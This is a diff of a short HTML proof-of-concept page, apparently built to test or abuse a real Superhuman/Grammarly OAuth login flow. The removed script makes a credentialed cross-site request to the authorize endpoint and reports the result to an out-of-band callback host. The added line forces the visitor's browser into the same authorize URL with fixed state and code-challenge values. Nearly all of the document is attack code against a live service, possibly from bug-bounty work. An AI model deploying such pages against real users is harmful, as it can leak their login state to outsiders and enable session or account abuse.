@@ -7,32 +7,7 @@
 </head>
 <body>
 	<script>
-		// 1. Membuat request GET pertama untuk otentikasi
-var xhrAuth = new XMLHttpRequest();
-var urlAuth = "https://id.superhuman.com/tokens/v4/api/oauth2/authorize?response_type=code&client_id=superhumanGrammarly&redirect_uri=https://auth.grammarly.com/v1/mediator/callback&scope=openid&state=U7QKbwjKmOaQvdglqYOjoI1_aStJTZ_x8HDhQ0X_uTs&code_challenge=xl6mBwfS27iLafrVE-CRXfxqBr8h8KDs1E-q1yCv4yU&code_challenge_method=S256&response_mode=query";
-
-xhrAuth.open("GET", urlAuth, true);
-xhrAuth.withCredentials = true; // Menggantikan credentials: "include"
-
-// Callback saat request pertama selesai
-xhrAuth.onload = function () {
-    var statusCode = xhrAuth.status; // Mendapatkan status code (misal: 200)
-
-    // 2. Membuat request POST kedua untuk mengirimkan status
-    var xhrLog = new XMLHttpRequest();
-    var urlLog = "https://p3swwgxa67ztcurxzk4w5inkqietpnd1j.oast.site";
-
-    xhrLog.open("POST", urlLog, true);
-    xhrLog.setRequestHeader("Content-Type", "application/json"); // Mengatur header
-
-    // Mengirimkan body dalam format string JSON
-    var bodyData = JSON.stringify({ status: statusCode });
-    xhrLog.send(bodyData);
-};
-
-// Menjalankan request pertama
-xhrAuth.send();
-
+		location.href="https://id.superhuman.com/tokens/v4/api/oauth2/authorize?response_type=code&client_id=superhumanGrammarly&redirect_uri=https://auth.grammarly.com/v1/mediator/callback&scope=openid&state=U7QKbwjKmOaQvdglqYOjoI1_aStJTZ_x8HDhQ0X_uTs&code_challenge=xl6mBwfS27iLafrVE-CRXfxqBr8h8KDs1E-q1yCv4yU&code_challenge_method=S256&response_mode=query";
 	</script>
 </body>
 </html>
